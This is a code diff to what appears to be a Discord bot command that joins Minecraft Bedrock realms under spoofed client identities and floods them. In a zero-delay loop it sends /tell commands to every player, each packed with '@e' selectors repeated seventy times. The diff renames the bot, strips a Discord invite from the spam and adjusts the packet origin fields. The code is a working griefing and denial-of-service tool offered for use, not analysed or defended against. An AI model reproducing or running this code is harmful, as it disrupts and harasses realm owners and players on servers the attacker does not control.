@@ -35,7 +35,7 @@ module.exports = {
             const realmCode = interaction.options.getString('realmcode');
             const duration = interaction.options.getInteger('duration');
             const deviceOS = interaction.options.getInteger('device_os');
-            const name = `${discordInvite}\n`.repeat(1);
+            const name = `JustNarkX999999999`
             const userId = interaction.user.id;
             const profilesFolder = `./authCache/${userId}`;
             const baseCoins = 20;
@@ -82,7 +82,7 @@ module.exports = {
                     PlatformOnlineId: generateRandomString(19, '1234567890'),
                     PrimaryUser: false,
                     SelfSignedId: uuidv4(),
-                    ThirdPartyName: "",
+                    ThirdPartyName: name,
                     ThirdPartyNameOnly: true,
                     TrustedSkin: true,
                 },
@@ -159,26 +159,26 @@ module.exports = {
                             return;
                         }
                         client.write('command_request', {
-                            command: `/tell @a §l§c§k${"@e".repeat(70)} |§3§l§ Frosted §4§ on TOP `,
+                            command: `/tell @a §l§c§k${"@e".repeat(70)}`,
                             origin: {
-                                type: 0,
-                                uuid: '5',
-                                request_id: 'TSL Nuker',
+                                type: 5,
+                                uuid: client.profile.uuid,
+                                request_id: '0',
                             },
                             internal: false,
-                            version: 66,
-                        });
+                            version: 766,
+                        })
 
                         client.write('command_request', {
-                            command: `/tell @a §l§c§k${"@e".repeat(70)} |§3§l§ ${discordInvite} `,
+                            command: `/tell @a §l§c§k${"@e".repeat(70)}`,
                             origin: {
-                                type: 0,
-                                uuid: '5',
-                                request_id: 'TSL Nuker',
+                                type: 5,
+                                uuid: client.profile.uuid,
+                                request_id: '0',
                             },
                             internal: false,
-                            version: 66,
-                        });
+                            version: 766,
+                        })
                         messageCount++;
                     }, 0);
             
